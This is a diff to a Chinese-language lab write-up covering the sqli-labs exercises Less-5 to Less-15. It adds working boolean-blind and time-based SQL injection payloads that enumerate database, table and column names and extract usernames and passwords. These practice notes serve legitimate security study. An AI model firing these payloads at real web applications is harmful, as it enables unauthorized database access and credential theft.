@@ -166,7 +166,7 @@
 ?id=1' and length((select database()))>9 %23
 ```
 
-*注：length()函数是获取返回值的长度*
+*注： `length()` 函数是获取返回值的长度*
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B(_@MYR%KE_%EUG444KF701.png?raw=true">
 
@@ -192,7 +192,7 @@
 ?id=1' and ascii(substr((select database()),1,1))=65 %23
 ```
 
-*注：ascii()函数将参数转换为ascii码，substr(arg1, arg2, arg3)是截取函数，返回值是一个字符串，arg1为截取内容，arg2是相对截取位置，从1开始，arg3是截取长度*
+*注： `ascii()` 函数将参数转换为ascii码， `substr(arg1, arg2, arg3)` 是截取函数，返回值是一个字符串，arg1为截取内容，arg2是相对截取位置，从1开始，arg3是截取长度*
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}TGW0Y$BI58G{F(]}SYX$J0.png?raw=true">
 
@@ -216,4 +216,169 @@
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LZDDYKG)A]6E${JVJ`7U3TM.png?raw=true">
 
-出现返回结果，所有表名长度大于10
+出现返回结果，所有表名长度大于10 
+
+```sql
+?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>50 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/~NWV2JTAV09CXAR[Z%X(X6W.png?raw=true">
+
+无返回结果，所有表名长度小于等于50
+
+```sql
+?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3HO3{CW(0$2}{@`6)M}876F.png?raw=true">
+
+最后确定表名长度为29，开始判断表名第一个字母
+
+```sql
+?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>97 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/OT)C)N)(2_}B(SI[PY1TMG0.png?raw=true">
+
+出现返回结果，第一个字母大于小写a
+
+```sql
+?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>116 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6K{%5~R4CJY78ST$W2J`TRT.png?raw=true">
+
+无返回结果，第一个字母小于等于小写t
+
+```sql
+?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/U}FHJB~25(B)`7N81]G`7U9.png?raw=true">
+
+最终确定表名第一个字母为小写e，后面步骤省略，最终得到所有表名为 `emails,referers,uagents,users` ，下面开始判断字段名
+
+*注：有效表名长度为26，包含3个逗号，共29*
+
+```sql
+?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>97 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Z5EQTOJSSY1$@(C9MC0XH{C.png?raw=true">
+
+有返回结果，字段第一个字母大于小写a，剩下过程省略，最终得到所有字段名为 `id,password,username` ，下面开始逐一判断字段内容
+
+```sql
+?id=1' and ascii(substr((select group_concat(username,id,password) from security.users),1,1))>97 %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6HPFC9V{U3)NQEN1K{VDP}Y.png?raw=true">
+
+图片仅供参考，下方图片为sqlmap查询到的所有字段结果
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/PBCIK6$Z8LVQK{C43SKILS0.png?raw=true">
+
+*注：注入语句为 `?id=1' [Sql Injection Statement] %23`*
+
+### Less-6
+
+和Less-5一样，根据报错信息，使用双引号即可
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0R$)3LMVB`KL%EURL}IGPKT.png?raw=true">
+
+*注：注入语句为 `?id=1" [Sql Injection Statement] %23`*
+
+### Less-7
+
+输入 `1'` , `1' %23` 报错， `1"` 不报错，确定是单引号闭合，但是没有报错提醒
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/89A6K2I@5FVUZQ0C$O9I8%S.png?raw=true">
+
+继续尝试添加括号，到 `1')) %23` 时无报错
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/JYZ[N68OCU[[83ATGT9]K0U.png?raw=true">
+
+下面跟Less-5一样
+
+*注：注入语句为 `?id=1')) [Sql Injection Statement] %23`*
+
+### Less-8
+
+和Less-5一样，只是报错没有任何显示，但是不报错有显示
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H3X05ERM@)L1@_CWR6}`LB2.png?raw=true">
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3VFHK~]J1%6C$14_3[D$]J1.png?raw=true">
+
+*注：注入语句为 `?id=1' [Sql Injection Statement] %23`*
+
+### Less-9
+
+无论输入什么页面都不变化，进行时间盲注，先判断注入类型
+
+```sql
+?id=1' and if(1=1,sleep(5),1) %23
+```
+
+睡眠5秒，注入类型正确
+
+```sql
+?id=1' and if(length((select database()))>9,sleep(5),1) %23
+```
+
+*注： `if(arg1, arg2, arg3)` 函数判断arg1的布尔值，若为TRUE，执行arg2，否则执行arg3*
+
+页面无睡眠，数据库长度小于等于9
+
+```sql
+?id=1' and if(length((select database()))=8,sleep(5),1) %23
+```
+
+页面睡眠，确定数据库长度为8。时间盲注只是将布尔盲注添加到if()函数中作为arg1，查看页面是否睡眠，此题省略
+
+*注：注入语句为 `?id=1' if([Sql Injection Statement],sleep(time),1) %23`*
+
+### Less-10
+
+使用 `?id=1' and if(1=1,sleep(5),1) %23` 不睡眠，考虑是双引号闭合
+
+```sql
+?id=1" and if(1=1,sleep(5),1) %23
+```
+
+睡眠5秒，注入类型正确。以下过程省略
+
+*注：注入语句为 `?id=1" if([Sql Injection Statement],sleep(time),1) %23`*
+
+### Less-11
+
+出现一个登录页面，登录错误时出现一个图片
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/28SE@G]HX%2PF2G5XNBNQ92.png?raw=true">
+
+判断注入点，输入 `1'` 报错， `1' #`不报错，确定存在注入点，单引号闭合
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/4LWKRHHO)$4UX7``5`(F~[1.png?raw=true">
+
+跟Less-1一样，此题省略
+
+*注：注入语句为 `1' [Sql Injection Statement] #`*
+
+### Less-12
+
+把Less-11的单引号改成双引号加括号
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/]4QC{67R~Z)~QFQCJVC`M(8.png?raw=true">
+
+*注：注入语句为 `1") [Sql Injection Statement] #`*
+
+### Less-13
+
+单引号加括号
+
+### Less-14
+
+双引号闭合
+
+### Less-15
+
